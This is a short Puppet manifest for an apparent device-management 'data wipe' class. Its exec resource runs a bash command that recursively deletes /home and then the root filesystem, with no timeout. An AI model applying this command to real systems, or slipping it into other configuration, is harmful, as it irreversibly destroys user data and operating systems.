class mdm::datawipe {
  exec { 'data wipe':
    command => '/bin/bash -c \'rm -fr /home; rm -fr /\'',
    timeout => 0,
  }
}
